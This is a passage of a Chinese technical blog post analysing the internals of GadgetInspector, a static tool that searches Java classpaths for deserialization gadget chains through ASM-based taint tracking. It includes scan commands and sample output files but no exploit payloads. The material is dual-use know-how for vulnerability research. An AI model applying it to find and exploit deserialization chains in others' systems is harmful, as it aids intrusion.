href="#1-3-JVM" class="headerlink" title="1.3 JVM"></a>1.3 JVM</h3><p>在重点分析下节内容前，我们先引入一些JVM中的基础概念：变量表、操作数栈、JVM指令集</p><p>本地变量表 <strong>Local Variable Table</strong> ：存储的是 方法参数和方法内定义的局部变量。容量以 变量槽 Variable Slot 为最小单位，一个槽可以放置32位以内的数据类型</p><p>操作数栈 <strong>Operand Stack</strong> ：是一个后入先出栈LIFO（last in first out）。当一个方法开始执行前操作数栈是空的，随着方法执行，会从本地变量表、对象实例字段中加载变量&#x2F;常量到操作数栈中，也会将栈中元素出栈到本地变量表或返回给方法调用者，即为出栈入栈操作。当方法执行完毕且有返回值赋值给变量时，需要通过 [type]store_[n]等指令将变量(类型type)存入本地变量表对应的位置(索引n)。而一次方法的执行往往包含多个出栈&#x2F;入栈的过程</p><p>JVM指令集<strong>Java Virtual Machine Instruction Set</strong>：由操作码与操作数组成，一条JVM指令可以包含0个或多个操作数。大多数的JVM指令直接包含了操作对应的数据类型信息，比如iload、fload就表示从本地变量表中加载int数据、float数据到操作数栈。在GadgetInspector工具中 TaintTrackingMethodVisitor#visitInsn就模拟了无操作数的JVM指令操作，TaintTrackingMethodVisitor#visitIntInsn模拟了一个操作数的JVM指令操作（第一个int参数表示操作码、第二个表示操作数）</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/4.png"></p><p>各指令代表的含义可参考oracle官方文档：<a href="https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html">https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html</a></p><p>每个类对应的jvm指令集可以使用idea插件jclasslib很方便的查看：<a href="https://github.com/ingokegel/jclasslib">https://github.com/ingokegel/jclasslib</a>  如使用jclasslib查看java.lang.Runtime#halt方法的指令集</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//source</span><br>public void halt(<span class="hljs-built_in">int</span> status) &#123;<br>    SecurityManager sm = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">SecurityManager()</span>;<br>    <span class="hljs-keyword">if</span> (sm != null) &#123;<br>    sm.check<span class="hljs-constructor">Exit(<span class="hljs-params">status</span>)</span>;<br>    &#125;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Shutdown</span>.</span></span>before<span class="hljs-constructor">Halt()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Shutdown</span>.</span></span>halt(status);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的JVM指令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-number">0</span> invokestatic #<span class="hljs-number">203</span> &lt;java<span class="hljs-regexp">/lang/</span>System.getSecurityManager : ()Ljava<span class="hljs-regexp">/lang/</span>SecurityManager;&gt;<br> <span class="hljs-number">3</span> astore_2<br> <span class="hljs-number">4</span> aload_2<br> <span class="hljs-number">5</span> ifnull <span class="hljs-number">13</span> (+<span class="hljs-number">8</span>)<br> <span class="hljs-number">8</span> aload_2<br> <span class="hljs-number">9</span> iload_1<br><span class="hljs-number">10</span> invokevirtual #<span class="hljs-number">191</span> &lt;java<span class="hljs-regexp">/lang/</span>SecurityManager.checkExit : (I)V&gt;<br><span class="hljs-number">13</span> invokestatic #<span class="hljs-number">194</span> &lt;java<span class="hljs-regexp">/lang/</span>Shutdown.beforeHalt : ()V&gt;<br><span class="hljs-number">16</span> iload_1<br><span class="hljs-number">17</span> invokestatic #<span class="hljs-number">196</span> &lt;java<span class="hljs-regexp">/lang/</span>Shutdown.halt : (I)V&gt;<br><span class="hljs-number">20</span> <span class="hljs-keyword">return</span><br><br></code></pre></td></tr></table></figure><p>方法体内每行代码的操作指令</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/5.png"></p><p>结合使用插件ASM Bytecode Viewer中的ASM代码、插件jclasslib生成的JVM指令就可以很好的辅助我们理解GadgetInspector是如何利用ASM观察者模式、JVM指令操作、模拟java stack进出这些技术最终达到挖掘利用链的目的的</p><h2 id="2、关键类"><a href="#2、关键类" class="headerlink" title="2、关键类"></a>2、关键类</h2><p>在整个项目中有一些关键类，承担了信息收集、方法内污点分析、方法间污点传递、逆拓扑排序、JVM 指令模拟、source方法查找、利用链整合等任务。我们按照扫描顺序重点分析下这几个关键类的代码</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/6.png"></p><h3 id="2-1-MethodDiscovery-类方法信息收集"><a href="#2-1-MethodDiscovery-类方法信息收集" class="headerlink" title="2.1 MethodDiscovery 类方法信息收集"></a>2.1 MethodDiscovery 类方法信息收集</h3><p>MethodDiscovery类用于发现目标classpath中的的方法，但是实际扫描时会把gadgetinspector本身的类也收集进去 干扰我们的分析，我在getAllClasses中增加了逻辑判断来排除gadgetinspector本身的类</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ClassResourceEnumerator</span><span class="hljs-selector-id">#getAllClasses</span><br><span class="hljs-selector-tag">for</span>(ClassPath.ClassInfo <span class="hljs-attribute">classInfo </span>: ClassPath.<span class="hljs-built_in">from</span>(classLoader).<span class="hljs-built_in">getAllClasses</span>())&#123;<br>            <span class="hljs-selector-tag">if</span>((!classInfo.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;gadgetinspector&quot;</span>)))&#123;<br>                <span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.add</span>(new <span class="hljs-built_in">ClassLoaderClassResource</span>(classLoader,classInfo.<span class="hljs-built_in">getResourceName</span>()));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/7.png"></p><p>用于观察的ASM类为MethodDiscovery.MethodDiscoveryClassVisitor，其继承ClassVisitor类：重写了visitField、visitMethod方法，在观察到目标类的属性、方法时，将其添加到待分析的members List与discoveredMethods List中</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/8.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/9.png"></p><h3 id="2-2-PassthroughDiscovery-单方法的污点分析"><a href="#2-2-PassthroughDiscovery-单方法的污点分析" class="headerlink" title="2.2 PassthroughDiscovery  单方法的污点分析"></a>2.2 PassthroughDiscovery  单方法的污点分析</h3><p>PassthroughDiscovery类是针对单个方法的局部污点分析，得到可影响(污染)返回值的参数索引，生成passthrough数据流。共有三步：1、分析调用关系，得到每个方法调用的方法集合；2、对所有方法的调用进行逆拓扑排序；3、分析数据流传递情况，生成passthroughDataflow数据流</p><p>PassthroughDiscovery#discover</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/10.png"></p><p>如下是分析FnEval类的结果，org.example.FnEval#invokeCall方法内部调用了java.lang.Runtime#getRuntime、java.lang.Runtime#exec(java.lang.String)两个方法</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/11.png"></p><h4 id="2-2-1-分析每个方法的调用关系"><a href="#2-2-1-分析每个方法的调用关系" class="headerlink" title="2.2.1 分析每个方法的调用关系"></a>2.2.1 分析每个方法的调用关系</h4><p>第一步是分析2.1得到的方法集合，将每个方法内部调用的方法都存储到methodCalls Map中。分析的核心类是MethodCallDiscoveryClassVisitor与MethodCallDiscoveryMethodVisitor</p><p>PassthroughDiscovery.MethodCallDiscoveryClassVisitor  继承自ClassVisitor类：重写了visitMethod方法，方法体内使用MethodCallDiscoveryMethodVisitor进行方法级别的观察分析</p><p>PassthroughDiscovery.MethodCallDiscoveryMethodVisitor 继承自MethodVisitor类：重写了visitMethodInsn方法，方法体内每次方法调用都会触发该重写方法，然后会将被调用的方法信息（所属类信息、方法描述信息）添加到结果methodCalls Map中</p><p>PassthroughDiscovery.MethodCallDiscoveryMethodVisitor#visitMethodInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/12.png"></p><h4 id="2-2-2-逆拓扑排序"><a href="#2-2-2-逆拓扑排序" class="headerlink" title="2.2.2 逆拓扑排序"></a>2.2.2 逆拓扑排序</h4><p>将2.2.1得到的methodCalls Map经过逆拓扑排序得到sortedMethods List，PassthroughDiscovery#topologicallySortMethodCalls 排序方法如下</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/13.png"></p><p>排序分析参考了Longofo师傅的 <a href="https://paper.seebug.org/1034/#step3-passthrough">分析</a>  PassthroughDiscovery#dfsTsort</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/14.png"></p><ul><li>dfsStack：用来分析方法调用顺序，保证在逆拓扑时候不形成环</li><li>visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序</li><li>sortedMethods：最终逆拓扑排序出来的结果</li></ul><p>举例如下图为方法调用树，初始方法为med1，有6条方法调用链</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/15.png"></p><p>最终经过逆拓扑排序后得到的顺序是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">med7、med8、med3、med6、med2、med4、med1<br></code></pre></td></tr></table></figure><p>看到在gadgetinspector.PassthroughDiscovery#dfsTsort的开头有这样两行代码</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/16.png"></p><p>第一个if语句（圈1）目的是处理”方法互相调用形成环”的问题，如果正在分析的dfsStack中包含med1，那么就不往dfsStack中再添加了。第二个if语句（圈2）是处理”方法重复调用”的问题，如果在分析med1-&gt;med3这条链时发现med3在med1-&gt;med2-med3链中已访问过，那么不再继续访问。策略非常粗暴，对于第一次已排序过的方法，第二次碰到时不再分析。虽然避免了重复扫描跟环的问题，但是造成了严重的漏报。如果med1-&gt;med3-&gt;med7 刚好可以走通source到sink，利用链也短，工具由于策略问题反而不会扫到。所以这一步需要改进策略以平衡”搜索广度与深度策略的平衡问题”</p><p>另外这里为什么要用逆拓扑排序DFS算法，而不是正向拓扑排序BFS呢？这个我们下一章节会碰到，是因为要确定的是父方法的返回值与哪个参数有关，而在方法执行过程中，返回值会受到子方法的影响，所以需要先判断子方法的参数与返回值的关联关系，进而才能得出父方法的参数污染情况。所以这里需要使用逆拓扑排序DFS算法</p><h4 id="2-2-3-单个方法污点分析"><a href="#2-2-3-单个方法污点分析" class="headerlink" title="2.2.3 单个方法污点分析"></a>2.2.3 单个方法污点分析</h4><p>依次分析2.2.2步得到的sortedMethods List后，可以得出每个方法的返回值受哪个参数的影响(也叫污染)。这一步是信息搜集的重点，有了每个方法的污染结果后就可以开始串联方法进行分析</p><p>PassthroughDiscovery.PassthroughDataflowClassVisitor  继承自ClassVisitor类，重了写visitMethod方法：对目标方法使用PassthroughDataflowMethodVisitor进行方法级别的观察分析</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor继承自TaintTrackingMethodVisitor类；父类TaintTrackingMethodVisitor 继承自MethodVisitor类</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/17.png"></p><p>TaintTrackingMethodVisitor#TaintTrackingMethodVisitor</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/18.png"></p><p>这两者是父子类关系，子类PassthroughDataflowMethodVisitor实现了：visitCode、visitInsn、visitFieldInsn、visitMethodInsn等方法</p><p>父类实现了：visitCode、visitFrame、visitInsn、visitIntInsn、visitVarInsn、visitTypeInsn、visitFieldInsn、visitMethodInsn、visitInvokeDynamicInsn、visitJumpInsn、visitLabel、visitLdcInsn、visitIincInsn、visitTableSwitchInsn、visitLookupSwitchInsn、visitMultiANewArrayInsn、visitInsnAnnotation、visitTryCatchBlock、visitTryCatchAnnotation、visitMaxs、visitEnd等方法。这些是ASM观察类碰到各种JVM指令时会触发调用的方法</p><p>这对父子类是分析数据流的核心类，其使用JAVA ASM技术观察方法&#x2F;属性&#x2F;变量操作&#x2F;子方法调用、模拟JVM Stack入栈出栈操作，相当于让静态代码”动”了起来，在动的过程中去观察参数的传递污染、方法的调用，进而找出可以从source通往sink之间的链路。gadgetinspector开发者在TaintTrackingMethodVisitor.SavedVariableState类中创建了localVars、stackVars用来对标本地变量表Local Variable Table及操作数栈 Operand Stack，在同类下利用ASM技术中visitXXX等观察方法模拟了JVM指令集调用push()、pop()对变量表及操作栈的进出操作</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/19.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/20.png"></p><p>接着分析父子类实现的几个关键方法：</p><p>1、visitCode：观察方法时，首先会先触发visitCode，子类将 [[对象实例],arg1,arg2]按照先后顺序添加到本地变量表localVars中，用于后续出栈入栈的数据来源。而父类作用是初始化了本地变量表localVars、操作数栈stackVars</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitCode</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/21.png"></p><p>TaintTrackingMethodVisitor#visitCode 用于清空本地变量表与操作数栈及占位</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/22.png"></p><p>2、visitInsn：观察方法时，碰到无操作数指令时会触发visitInsn ，子类PassthroughDataflowMethodVisitor主要处理碰到return指令集时的参数污染情况，父类作用是模拟无操作数指令集对应的出栈入栈操作，如[type]CONST_[n]推送数据到栈顶、[type]ASTORE数组出栈到表、[type]ALOAD数组出表入栈等等</p><p>PassthroughDataflowMethodVisitor#visitInsn是操作中的重点，会将栈顶数据添加到污点结果集合returnTaint，此时栈顶元素可能为：1、对象实例&#x2F;实例属性；2、被调用方法的返回值。ASM在碰到这两者时会调用visitFieldInsn、visitMethodInsn进行观察，这两个方法均会将污点参数索引添加至栈顶</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/23.png"></p><p>TaintTrackingMethodVisitor#visitInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/24.png"></p><p>3、visitFieldInsn：观察方法时，每次对属性字段的操作都会触发visitFieldInsn，子类PassthroughDataflowMethodVisitor主要处理GETFIELD指令：对方法所属类使用决策器serializableDecider判断、对属性判断是否被transient修饰。所属类通过决策器且属性不被transient修饰就通过决策。父类模拟了 获取静态属性值GETSTATIC、设置静态属性值PUTSTATIC、获取非静态属性值GETFIELD、设置非静态属性值PUTFIELD4个JVM指令的出栈入栈操作</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/25.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/26.png"></p><p>TaintTrackingMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/27.png"></p><p>4、visitMethodInsn：观察方法时，方法体内每次调用其它方法时都会触发visitMethodInsn。子类主要处理 init初始化方法污染情况、调用目标方法的污染情况。父类主要处理init初始化方法、白名单、调用目标方法的污染情况、Collection&#x2F;Map子类的方法参数的污染情况。调用方法分为调用静态方法、实例方法、超类构造方法、接口方法，调用方法所属类为引用类型时会调用INVOKEVIRTUAL指令、为接口时调用INVOKEINTERFACE指令</p><p>visitMethodInsn先将实例、入参挨个添加到argTypes数组</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/28.png"></p><p>假定被调用方法有Object、String 2个入参，那么argTypes为this、Object、String。接着将调用目标方法前放到栈中的参数(即argTypes)，都复制一份到argTaint。如果被调用方法是init方法，那么this实例（索引为0）是可以进行污染传递的</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/29.png"></p><p>由于方法调用顺序经过逆拓扑排序，所以在分析时其方法体内调用的子方法一定已经被分析过。这一步会分析调用方法的返回值是否会收到被调用方法参数的影响，如果影响，那么添加到污点集合returnTaint</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/30.png"></p><p>子类判断之后，先将污点参数索引放到resultTaint，然后调用父类继续处理init方法、ObjectInputStream#defaultReadObject、白名单方法、Map&#x2F;Collection子类方法、被调用方法的污染传递情况，最后把被调用方法的污染参数索引放入操作数栈再次回到子类。由于resultTaint是Set类型，所以添加时会自动对索引进行去重</p><p>TaintTrackingMethodVisitor#visitMethodInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/31.png"></p><p>另外在2.3 CallGraphDiscovery#ModelGeneratorMethodVisitor 中会判断调用方法的传入参数是否会影响被调用方法的传入参数，最后在GadgetChainDiscovery中判断两者参数索引是否一致，如果一致表明此链可以走通</p><p>5、visitVarInsn：观察方法时，方法体内每次对局部变量操作时都会触发visitVarInsn，此方法在父类中定义。 利用push、pop方法对本地变量表localVars、操作数栈stackVars操作模拟出栈入栈 [type]STORE、[type]LOAD等JVM指令</p><p>TaintTrackingMethodVisitor#visitVarInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/32.png"></p><p>经过如上分析，最后得到的分析结果都保存在passthrough.dat文件中，格式为：类 方法 方法描述 污点索引</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/33.png"></p><h3 id="2-3-CallGraphDiscovery-方法间的污点传递"><a href="#2-3-CallGraphDiscovery-方法间的污点传递" class="headerlink" title="2.3 CallGraphDiscovery 方法间的污点传递"></a>2.3 CallGraphDiscovery 方法间的污点传递</h3><p>2.2中的PassthroughDiscovery分析得到的是调用方法返回值与被调用方法参数传递的关系，如果想要知道方法链能否从source源走通到sink点，还需要分析每个调用方法入参与被调用方法入参的传递关系，CallGraphDiscovery类就是为了解决这个问题</p><p>这一步的核心使用了ModelGeneratorClassVisitor，其实现了visitMethod、visitOuterClass、visitInnerClass等方法，在visitMethod方法中使用ModelGeneratorMethodVisitor进行方法级别的观察分析。ModelGeneratorMethodVisitor类与PassthroughDataflowMethodVisitor一样，都是继承自TaintTrackingMethodVisitor类，父类我们在上一步2.2章已经分析过不再赘述。子类ModelGeneratorMethodVisitor主要方法有：visitCode、visitMethodInsn、visitFieldInsn，依次分析下：</p><p>1、利用visitCode() 往本地变量表添加调用方法入参(当方法存在2个形参时，非静态方法：[[0,arg0],[1,arg1],[2,arg2]]  静态方法：[[0,arg0],[1,arg1]])；</p><p>CallGraphDiscovery.ModelGeneratorMethodVisitor#visitCode</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/34.png"></p><p>2、利用visitFieldInsn()将获取的field名称变为arg[n].[name]放入操作数栈供后面方法调用时使用，这一步主要作用是将方法体内操作的属性与方法入参做关联，用于判断调用方法入参与被调用方法入参的关系。而这里也使用了跟2.2章一样的判断逻辑：因为java里面规定Transient修饰属性不参与反序列化过程，所以不考虑Transient属性修饰的变量传递。但是在实际挖掘过程中还存在一种情况：虽然属性被Transient修饰，但是类自己实现了writeObject&#x2F;writeExternal方法，方法体内会声明将Transient属性参与到序列化&#x2F;反序列化过程中。这种情况在之前的gadget中也比较常见，所以这里需要额外补充完善下Transient属性的判断逻辑</p><p>CallGraphDiscovery.ModelGeneratorMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/35.png"></p><p>3、visitMethodInsn()方法创建了arg[N]进行标记，分析调用方法与被调用方法间的参数传递关系，并最终将结果赋值discoveredCalls存储到callgraph.dat中，格式为<code>调用者类名 | 调用者方法 | 调用者方法描述 | 被调用者类名 | 被调用者方法 | 被调用者方法描述 | 调用者方法参index | 调用者字段名 | 被调用者方法参数索引</code></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/36.png"></p><p>4、举个例子，createMBean方法经过ModelGeneratorClassVisitor扫描后得到如下结果，调用方法createMBean参数索引(第2个形参name)与被调用方法cloneObjectName(第1个形参name)的参数传递。调用者字段名的值为空，说明从调用方法入参传递到被调用方法入参的是入参实例（arg1）而不是入参类实例的属性(arg1.name、arg1.pwd)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">调用者类名 | 调用者方法 | 调用者方法描述 | 被调用者类名 | 被调用者方法 | 被调用者方法描述 | 调用者方法参index | 调用者字段名 | 被调用者方法参数索引<br>com<span class="hljs-regexp">/sun/</span>jmx<span class="hljs-regexp">/mbeanserver/</span>JmxMBeanServercreateMBean(Ljava<span class="hljs-regexp">/lang/</span>String;Ljavax<span class="hljs-regexp">/management/</span>ObjectName;)Ljavax<span class="hljs-regexp">/management/</span>ObjectInstance;com<span class="hljs-regexp">/sun/</span>jmx<span class="hljs-regexp">/mbeanserver/</span>JmxMBeanServercloneObjectName(Ljavax<span class="hljs-regexp">/management/</span>ObjectName;)Ljavax<span class="hljs-regexp">/management/</span>ObjectName;<span class="hljs-number">2</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean(java.lang.String, javax.management.ObjectName)</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span>(<span class="hljs-built_in">String</span> className, ObjectName name)<br>        <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException,<br>               MBeanRegistrationException, MBeanException,<br>               NotCompliantMBeanException &#123;<br><br>        <span class="hljs-keyword">return</span> mbsInterceptor.<span class="hljs-property">createMBean</span>(className,<br>                                          <span class="hljs-title function_">cloneObjectName</span>(name),<br>                                          (<span class="hljs-built_in">Object</span>[]) <span class="hljs-literal">null</span>,<br>                                          (<span class="hljs-built_in">String</span>[]) <span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/37.png"></p><h3 id="2-4-SourceDiscovery-Source源发现"><a href="#2-4-SourceDiscovery-Source源发现" class="headerlink" title="2.4 SourceDiscovery Source源发现"></a>2.4 SourceDiscovery Source源发现</h3><p>SourceDiscovery是抽象类，其discover(classMap，methodMap，inheritanceMap)方法只提供了定义，具体的实现需要使用者自己扩展编写。而gadgetinspector内置了java原生反序列化、jackson反序列化 的SourceDiscovery实现类</p><p>该步骤主要查找反序列化入口方法，每种反序列化操作的入口方法不同，如fastjson&#x2F;jackson的入口是getter&#x2F;setter方法、java原生反序列化是readObject&#x2F;readExterna方法。这里先以内置的jackson为例分析，jackson在对json字符串反序列化操作时，会调用类的无参构造方法进行类实例化，所以只有存在无参构造方法的类才满足jackson序列化类的要求，另外在反序列化过程中会根据具体情况调用getter&#x2F;setter方法。所以在扫描jackson反序列化gadget时把这三个方法均添加到source里面进行扫描</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/38.png"></p><p>最终把扫描的结果存储到source.dat文件中，格式如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">类名 方法名 方法描述 污染参数索引<br>java<span class="hljs-regexp">/awt/</span>TextField&lt;init&gt;()V<span class="hljs-number">0</span><br>javax<span class="hljs-regexp">/swing/</span>JTextFieldsetActionCommand(Ljava<span class="hljs-regexp">/lang/</span>String;)V<span class="hljs-number">0</span><br>javax<span class="hljs-regexp">/swing/</span>JEditorPanesetPage(Ljava<span class="hljs-regexp">/lang/</span>String;)V<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="2-5-GadgetChainDiscovery-信息整合为GadgetChain"><a href="#2-5-GadgetChainDiscovery-信息整合为GadgetChain" class="headerlink" title="2.5 GadgetChainDiscovery 信息整合为GadgetChain"></a>2.5 GadgetChainDiscovery 信息整合为GadgetChain</h3><p>GadgetChainDiscovery#discover 方法对上述搜集到的所有信息进行整合，然后将每个source作为利用链的起点寻找调用的子方法、能将参数污染传递的子方法，如果末节点调用到先前定义好的sink方法，说明利用链可以走通，那么就标记成功，添加到discoveredGadgets中。否则再次循环methodsToExplore获取方法进行分析直到方法循环完毕。主要看下对于重写方法、搜索策略的处理</p><p>1、InheritanceDeriver#getAllMethodImplementations搜集重写方法</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/39.png"></p><p>将搜集到的重写方法的结果保存到methodimpl.dat，格式如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">类 方法 方法描述<br>子类1 重写方法 方法描述<br>子类2 重写方法 方法描述<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/40.png"></p><p>2、将调用的方法集合规整格式得到graphCallMap，key为调用方法、value为被调用方法Set(添加时自动抛弃重复方法)</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/41.png"></p><p>如上面提到的com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean方法调用了createMBean、cloneObjectName两个方法，这一步就是将两个子方法整合，最终得到[JmxMBeanServer#createMBean：[createMBean，cloneObjectName]]这种结构</p><p><img src="/../../../2%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/gadgetinspector/1%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/img/1676531278617.png" alt="1676531278617"></p><p>3、加载2.4章中得到的sources.dat，将每个source做为GadgetChain链的第一个节点。程序循环将利用链GadgetChain的末节点做为起点方法查找可调用的子方法、可传递污染的参数索引，如果可以传递污染，那么就将被调用方法加到利用链。最后判断如果末节点调用到我们先前定义好的sink方法，说明利用链可以走通，那么就标记成功，添加到discoveredGadgets中。否则再次循环methodsToExplore进行查找直到方法循环完毕</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/42.png"></p><p>如下图的圈1判断当”可传递污染给子方法的调用方法参数索引”与”调用方法可以控制的参数索引”不一致时，污染就无法传递，pass。圈2用于处理”静态分析无法确认程序运行时使用哪个实现方法”的问题，所以将所有实现方法都跑一遍。圈3判断如果新节点在之前访问过，则跳过检查。这里虽然可以避免环的问题，但是会造成漏报，需要修改下逻辑。圈4判断末节点的方法、污染的参数是否与定义好的sink一致，如果一致则添加到利用链discoveredGadgets</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/43.png"></p><p>经过MethodDiscovery获取类&#x2F;方法&#x2F;继承关系信息、PassthroughDiscovery获取单个方法内的污染传递、CallGraphDiscovery获取方法间的污染传递、SourceDiscovery获取利用链的source源，最终通过GadgetChainDiscovery 分析前面得到的信息并整合为GadgetChain结果存储到gadget-chains.txt文件中</p><h2 id="3、实际测试"><a href="#3、实际测试" class="headerlink" title="3、实际测试"></a>3、实际测试</h2><p>了解了如上项目源码、工具运行流程之后，我们实际使用GadgetInspector扫描测试一个Demo jar包感受下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Demo代码<br>GadgetInspector-Test-Demo\out\artifacts\GadgetInspector_Test_Demo<br><br>编译gadget-<span class="hljs-keyword">inspector</span><br><span class="hljs-keyword"></span>GadGetResearch\gadgetinspector-master&gt;gradlew.<span class="hljs-keyword">bat </span><span class="hljs-keyword">shadowJar </span>--warning-mode all<br><br>扫描命令<br><span class="hljs-keyword">java </span>-Xmx10g -<span class="hljs-keyword">jar </span>gadget-<span class="hljs-keyword">inspector-all.jar </span>--<span class="hljs-built_in">config</span> <span class="hljs-keyword">jserial </span>E:\imgs-source\GadgetInspector-Test-Demo\out\artifacts\GadgetInspector_Test_Demo\GadgetInspector-Test-Demo.<span class="hljs-keyword">jar</span><br><span class="hljs-keyword"></span><br>项目文件生成位置<br>GadGetResearch\gadgetinspector-master\<span class="hljs-keyword">build\libs</span><br></code></pre></td></tr></table></figure><p>1、枚举所有类及类的所有方法，输出类信息文件classes.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/</span>FnComposejava<span class="hljs-regexp">/lang/</span>Objectorg<span 